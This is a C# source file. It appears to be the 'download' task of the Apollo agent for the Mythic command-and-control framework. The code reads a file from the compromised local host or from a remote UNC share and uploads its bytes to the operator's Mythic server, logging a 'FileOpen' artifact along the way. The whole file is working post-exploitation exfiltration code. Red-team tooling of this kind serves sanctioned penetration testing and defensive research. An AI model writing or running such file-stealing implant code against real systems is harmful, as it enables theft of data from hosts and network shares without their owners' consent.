#define COMMAND_NAME_UPPER

#if DEBUG
#define DOWNLOAD
#endif

#if DOWNLOAD

using System;
using System.Linq;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System.Runtime.Serialization;
using System.IO;

namespace Tasks
{
    public class download : Tasking
    {
        [DataContract]
        internal struct DownloadParameters
        {
            [DataMember(Name = "file")]
            public string FileName;
            [DataMember(Name = "host")]
            public string Hostname;
        }

        private static string[] localhostAliases = new string[]
        {
            "localhost",
            "127.0.0.1",
            Environment.GetEnvironmentVariable("COMPUTERNAME").ToLower()
        };
        
        public download(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
        {

        }

        public override void Start()
        {
            MythicTaskResponse resp;
            try
            {
                DownloadParameters parameters = _jsonSerializer.Deserialize<DownloadParameters>(_data.Parameters);
                string host = parameters.Hostname;
                if (string.IsNullOrEmpty(parameters.Hostname) && !File.Exists(parameters.FileName))
                {
                    resp = CreateTaskResponse(
                        $"File '{parameters.FileName}' does not exist.",
                        true,
                        "error");
                }
                else
                {
                    string path;
                    if (string.IsNullOrEmpty(parameters.Hostname))
                    {
                        path = parameters.FileName;
                        string cwd = System.IO.Directory.GetCurrentDirectory().ToString();
                        if (cwd.StartsWith("\\\\"))
                        {
                            var hostPieces = cwd.Split('\\');
                            if (hostPieces.Length > 2)
                            {
                                host = hostPieces[2];
                                path = $@"\\{hostPieces[2]}\{parameters.FileName}";
                            }
                            else
                            {
                                resp = CreateTaskResponse($"invalid UNC path for CWD: {cwd}. Can't determine host. Please use explicit UNC path", true, "error");
                                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
                            }
                        }
                        else
                        {
                            host = Environment.GetEnvironmentVariable("COMPUTERNAME");
                        }

                    } else if (localhostAliases.Contains(parameters.Hostname.ToLower()))
                    {
                        path = parameters.FileName;
                        host = Environment.GetEnvironmentVariable("COMPUTERNAME");
                    }
                    else
                    {
                        path = $@"\\{parameters.Hostname}\{parameters.FileName}";

                    }
                    byte[] fileBytes = new byte[0];
                    fileBytes = File.ReadAllBytes(path);

                    IMythicMessage[] artifacts = new IMythicMessage[1]
                    {
                        new Artifact
                        {
                            BaseArtifact = "FileOpen",
                            ArtifactDetails = path
                        }
                    };
                    if (_agent.GetFileManager().PutFile(
                            _cancellationToken.Token,
                            _data.ID,
                            fileBytes,
                            parameters.FileName,
                            out string mythicFileId,
                            false,
                            host))
                    {
                        resp = CreateTaskResponse(mythicFileId, true, "completed", artifacts);
                    }
                    else
                    {
                        resp = CreateTaskResponse(
                            $"Download of {path} failed or aborted.",
                            true,
                            "error", artifacts);
                    }
                }
            }
            catch (Exception ex)
            {
                resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
            }

            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}
#endif